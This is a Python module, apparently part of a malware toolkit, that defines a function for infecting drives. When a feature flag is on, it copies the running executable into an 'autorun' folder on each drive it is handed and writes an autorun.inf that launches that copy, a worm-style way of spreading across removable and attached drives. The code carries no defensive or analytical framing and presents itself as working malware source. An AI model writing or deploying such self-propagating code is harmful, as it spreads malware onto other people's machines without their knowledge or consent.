import os
import shutil
import sys
from .config import FEATURE_DRIVES_INJECTION_ENABLED, DRIVES_INJECTION_SKIPPED
from .debug import message as debug_message
from . import fs


def drive_inject_autorun_executable(drive: str) -> None:
    """ Injects autorun executable. """

    if not FEATURE_DRIVES_INJECTION_ENABLED:
        return

    try:
        if drive in DRIVES_INJECTION_SKIPPED:
            return

        # Code below copies running executable in secret folder,
        # And adds this executable in to drive autorun file.

        executable_path = "autorun\\autorun." + fs.executable_get_extension()

        if not os.path.exists(drive + executable_path):
            fs.build_path(drive + executable_path)
            shutil.copyfile(sys.argv[0], drive + executable_path)

            with open(drive + "autorun.inf", "w", encoding="UTF-8") as autorun_file:
                autorun_file.write(f"[AutoRun]\nopen={executable_path}\n\naction=Autorun\\Autorun")
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Drive Inject] Error when trying to inject drive! Exception - {exception}")
